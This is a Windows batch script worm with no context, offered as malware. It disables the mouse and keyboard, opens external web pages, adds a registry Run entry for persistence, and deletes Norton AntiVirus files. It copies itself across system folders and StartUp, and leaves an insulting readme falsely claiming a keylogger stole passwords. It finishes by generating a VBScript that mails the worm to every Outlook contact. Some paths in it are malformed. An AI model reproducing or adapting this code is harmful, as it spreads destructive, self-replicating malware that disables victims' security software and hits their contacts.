@ECHO OFF
C:\windows\rundll.exe mouse,disable
C:\windows\rundll.exe keyboard,disable
Echo Welcome 
Echo 2
Echo Ur
Echo Worst
Echo Nitemare!
Echo 10
Echo 5
Echo 0
Echo Let's Begin!
Start Iexplore http://www.geocities.com/legibleskate/hacked.html
Start Iexplore http://www.geocities.com/legibleskate/dick.html
echo >> C:\windows\rundll32.reg
echo. >> C:\windows\rundll32.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> C:\windows\rundll32.reg
echo "Virus"="C:\\windows\\system32\\virus.bat" >> C:\windows\rundll32.reg
REGEDIT /S C:\windows\rundll32.reg
Cd\
C:\Program Files\Norton AntiVirus
Del NavStub.exe
Del Navw32.exe
Del Bootwarn.exe
Echo Norton Destroy...
DEL C:\C:\progra~1\norton~1\**.dll
DEL C:\C:\progra~1\norton~1\**.exe
DEL C:\C:\progra~1\norton~1\**.ini
DEL C:\progra~1\norton~1\norton~1\**.dll
DEL C:\progra~1\norton~1\norton~1\**.exe
DEL C:\progra~1\norton~1\norton~1\**.ini
copy %0 C:\progra~1\norton~1\urAVisgone.bat
copy %0 C:\progra~1\norton~1\HAHA.bat
copy %0 C:\progra~1\norton~1\imavirus.bat
copy %0 C:\progra~1\norton~1\ugotproblems.bat
copy %0 C:\progra~1\norton~1\AV.bat
copy %0 C:\progra~1\norton~1\yes.bat
copy %0 C:\progra~1\norton~1\norton~1\thisisgonetoo.bat
copy %0 C:\progra~1\norton~1\norton~1\isntthisjustapainintheass.bat
copy %0 C:\progra~1\norton~1\norton~1\sucker.bat
Cd
C:\WINDOWS\Desktop
Echo Hello! Guess What? I have just del. Some Files! >>Readme.txt
Echo I have Opened Invisable Key Logger On your Computer >>Readme.txt
Echo So, Now every Key you have Typed any e-mail passwords, Ebay Passwords, Yahoo Auctions Passwords, Or more I have >>Readme.txt
Echo They have been sent out to 100 Diffrent People around the world! >>Readme.txt
Echo All to Hackers! >>Readme.txt
MD C:\Windows\Desktop\MyPorn
MD C:\Windows\Desktop\
MD C:\Windows\Desktop\Dick
MD C:\Windows\Desktop\Ass
MD C:\Windows\Desktop\Pussy
MD C:\Windows\Desktop\Fuckyou
MD C:\Windows\Desktop\Keylogger
MD C:\Windows\Desktop\MoreViruses
MD C:\Windows\Desktop\Trojans
MD C:\Windows\Desktop\Mcafee Kill
MD C:\Windows\Desktop\Norton Kill
MD C:\Windows\Desktop\Panda Kill
MD C:\Windows\Desktop\P.C. Illen Kill
If not exist C:\Filefuck.bat Copy %0 C:\WINDOWS\Desktop
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\System32
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\Cookies
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\Downloaded Program Files
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\Favorites
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\HELP
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\History
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\MEDIA
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\SYSTEM
If not exist C:\filefuck.bat Copy %0 C:\WINDOWS\SendTo
If not exist C:\Filefuck.bat Copy %0 C:\WINDOWS\Start Menu\Programs\StartUp
CLS
@ECHO OFF
@COPY %0 C:\MAPI_WORM.bat
@ECHO Dim x >> C:\MAPI_SEND.vbs
@ECHO on error resume next >> C:\MAPI_SEND.vbs
@ECHO Set fso ="Scripting.FileSystem.Object" >> C:\MAPI_SEND.vbs
@ECHO Set so=CreateObject(fso) >> C:\MAPI_SEND.vbs
@ECHO Set ol=CreateObject("Outlook.Application") >> C:\MAPI_SEND.vbs
@ECHO Set out= WScript.CreateObject("Outlook.Application") >> C:\MAPI_SEND.vbs
@ECHO Set mapi = out.GetNameSpace("MAPI") >> C:\MAPI_SEND.vbs
@ECHO Set a = mapi.AddressLists(1) >> C:\MAPI_SEND.vbs
@ECHO For x=1 To a.AddressEntries.Count >> C:\MAPI_SEND.vbs
@ECHO Set Mail=ol.CreateItem(0) >> C:\MAPI_SEND.vbs
@ECHO Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\MAPI_SEND.vbs
@ECHO Mail.Subject="Subject" >> C:\MAPI_SEND.vbs
@ECHO Mail.Body="Body" >> C:\MAPI_SEND.vbs
@ECHO Mail.Attachments.Add(C:\MAPI_WORM.bat) >> C:\MAPI_SEND.vbs
@ECHO Mail.Send >> C:\MAPI_SEND.vbs
@ECHO Next >> C:\MAPI_SEND.vbs
@ECHO ol.Quit >> C:\MAPI_SEND.vbs
@CALL C:\MAPI_SEND.vbs
@ERASE %0
EXIT